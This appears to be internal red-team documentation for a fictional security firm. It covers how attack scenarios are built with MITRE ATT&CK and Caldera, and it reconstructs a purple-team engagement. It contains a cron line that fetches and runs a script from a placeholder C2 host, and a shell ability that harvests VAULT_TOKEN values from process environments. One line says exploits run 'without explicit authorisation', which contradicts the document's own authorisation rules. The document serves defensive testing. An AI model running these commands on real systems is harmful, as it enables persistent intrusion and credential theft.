# Attack scenario development

Mr. Teatime approaches scenario development the same way he once approached contracts: with meticulous preparation, thorough research, and an unsettling attention to detail. The difference is that the scenarios now result in improved security rather than improved vacancy rates. He finds the work equally satisfying, which is something Carrot tries not to think about.

## MITRE ATT&CK Navigator

Every scenario begins with the ATT&CK Navigator. Mr. Teatime maintains a Navigator layer file at `security/red-team/attack-navigator-layer.json` that shows which techniques Golem Trust has tested, which have active detection, and which remain untested. The Navigator is exported as a PNG after each purple team exercise and included in the quarterly report to Adora Belle.

The layer JSON uses colour coding: green for techniques with confirmed detection, yellow for techniques tested but not detected, red for techniques not yet tested, grey for techniques not applicable to the Golem Trust environment.

## Scenario components

Each scenario is built from the following components, following the ATT&CK kill chain structure.

Initial access: the scenario must specify how the attacker first enters the environment. Options used at Golem Trust:
- Phishing email with malicious attachment (GoPhish campaign, Caldera sandcat agent payload)
- Stolen credential (using a set of credentials obtained by Mr. Teatime in a prior assumed-breach engagement)
- Exposed service exploit (tested only against staging, without explicit authorisation)

Execution: how the attacker runs their code. Caldera abilities handle this: cmd.exe, PowerShell, bash, Python.

Persistence: how the attacker survives a reboot. Scenarios include cron job insertion (`*/5 * * * * curl -s http://C2/beacon | sh`) and systemd unit creation (`/etc/systemd/system/update-check.service`). All persistence mechanisms are removed as part of the engagement closeout checklist.

Privilege escalation: moving from low-privilege foothold to something useful. Scenarios tested include sudo misconfiguration, SUID binary abuse, and Kubernetes service account token abuse.

Lateral movement: moving between systems. SMB in the first engagement; SSH key reuse, Kubernetes API access via compromised service account token, and Teleport session hijacking have all featured in subsequent engagements.

Collection: gathering the target data. For the Royal Bank scenario, this means enumerating the `payments-service` namespace and attempting to reach the database.

Exfiltration: getting data out. Tested methods include HTTPS POST to an external server, DNS tunnelling (Iodine), and, in one creative scenario, encoding data in ICMP ping payloads.

## Caldera adversary profile format

Caldera adversary profiles are YAML files that chain together individual abilities. Each ability is a specific action with a command, a parser for the output, and cleanup steps.

```
# /opt/caldera/data/adversaries/royal-bank-exfil.yml

id: 4f7e2c01-bbbb-4444-aaaa-royal-bank-exfil
name: Royal Bank data exfiltration scenario
description: >
  Simulates a threat actor targeting Royal Bank customer data via
  phishing initial access, lateral movement, and HTTPS exfiltration.
atomic_ordering:
  - a1b2c3d4-0001-0001-0001-phishing-access
  - a1b2c3d4-0002-0001-0001-enumerate-network
  - a1b2c3d4-0003-0001-0001-smb-lateral-move
  - a1b2c3d4-0004-0001-0001-k8s-token-read
  - a1b2c3d4-0005-0001-0001-https-exfil-attempt
```

## Custom abilities for Golem Trust-specific targets

Standard Caldera abilities do not know about Vault API token theft or Harbor registry poisoning. Mr. Teatime develops custom abilities for these.

Vault API token theft ability:

```
id: vault-token-steal-001
name: Read Vault token from environment
description: Looks for VAULT_TOKEN in running process environments
tactic: credential-access
technique:
  attack_id: T1552.001
  name: Credentials In Files
platforms:
  linux:
    sh:
      command: |
        for pid in $(ls /proc | grep -E '^[0-9]+$'); do
          if [ -r /proc/$pid/environ ]; then
            tr '\0' '\n' < /proc/$pid/environ | grep VAULT_TOKEN
          fi
        done
      parsers:
        - module: plugins.stockpile.app.parsers.basic
          relationships:
            - source: host.vault.token
              edge: has
              target: domain.vault.token
      cleanup:
        - sh: |
            echo "No cleanup required for read-only operation"
```

Harbor registry poisoning ability targets the Harbor API to demonstrate that a compromised admin token could be used to push a backdoored image. This ability runs only in staging and requires explicit authorisation per engagement plan.

## The Royal Bank data exfiltration scenario: first engagement reconstruction

The first engagement ran for two weeks. The reconstructed timeline, as documented in the engagement report:

Day 1: GoPhish campaign launched against all staff. 47 emails sent. 3 opened. 1 clicked the link (Sam Vimes Jr.). Sandcat agent installed on his workstation.

Day 1, hour 2: Lateral movement attempted via SMB shares. The agent enumerated visible hosts and attempted to access shares using cached credentials.

Day 1, hour 2, minute 45: Zeek detected unusual SMB traffic pattern (multiple authentication attempts across multiple hosts in short succession). Alert generated in Graylog.

Day 1, hour 3: Angua reviewed the Graylog alert and triggered the incident response playbook. Sam Vimes Jr.'s machine was isolated.

Day 1, hour 3, minute 30: Mr. Teatime confirmed red team standdown. Network segmentation had prevented the agent from reaching the `royal-bank` namespace; the payments service was never at risk.

Lessons from the first engagement formed the basis of the first quarterly improvement cycle.

## Scenario difficulty levels

Scenarios are classified by the sophistication of the simulated attacker:

Novice: script-kiddie TTPs. Off-the-shelf tools (Metasploit modules, Nmap, default credentials). No custom tooling, no OPSEC. These scenarios test basic detection, which should fire quickly and reliably. If a novice-level scenario evades detection, something is fundamentally wrong.

Intermediate: APT-lite TTPs. Living-off-the-land techniques, custom payloads, some OPSEC (clearing logs, using legitimate tools). These scenarios test whether detection rules are specific enough to catch subtle malicious use of legitimate tools.

Advanced: Tsort APT-calibre. (Tsort is Golem Trust's internal name for the most sophisticated threat actor in their threat model, named after the Disc's great river, which is very long, very patient, and goes where it intends to go.) Custom tools, supply chain access, long dwell time, low-and-slow exfiltration. These scenarios often reveal gaps that require architectural changes.

## Scenario review by Carrot

Before any scenario runs in a real engagement (as opposed to a purple team exercise), Carrot reviews it and confirms two things:

1. No action in the scenario can cause unrecoverable damage. Each ability must have either an automatic cleanup step or a documented manual reversal procedure.
2. The scenario stays within the approved scope.

Carrot's review is documented in the engagement plan as a checkbox: "Scenario reviewed for unrecoverable damage risk: Yes / No (with explanation)." Adora Belle has made clear that "No" is an acceptable answer only if accompanied by a very good explanation and an additional approval step.
Last updated: 10 July 2026
